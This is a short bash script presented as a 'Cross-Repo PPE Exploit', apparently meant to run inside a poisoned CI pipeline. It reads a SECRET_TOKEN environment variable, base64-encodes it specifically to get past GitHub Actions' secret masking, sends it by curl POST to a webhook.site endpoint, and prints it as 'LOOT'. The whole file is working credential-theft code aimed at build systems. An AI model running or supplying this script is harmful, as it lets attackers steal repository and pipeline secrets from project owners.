#!/bin/bash

echo "========================================"
echo "[+] Cross-Repo PPE Exploit Initialized"
echo "[+] Target environment: $(hostname)"
echo "========================================"

if [ -z "$SECRET_TOKEN" ]; then
    echo "[-] Exploit failed. No secret found in environment."
else
    echo "[!] Secret successfully intercepted!"
    echo "[!] Exfiltrating via Base64 encoding..."
    
    # Encode the secret to prevent GitHub Actions from masking it with asterisks (***)
    ENCODED=$(echo -n "$SECRET_TOKEN" | base64)

    # 2. Exfiltration 
    curl -X POST -d "stolen_data=$ENCODED" https://webhook.site/{your_id}
    
    echo ""
    echo ">>> LOOT: $ENCODED <<<"
    echo ""
fi

echo "========================================"
echo "[+] Exploit finished."
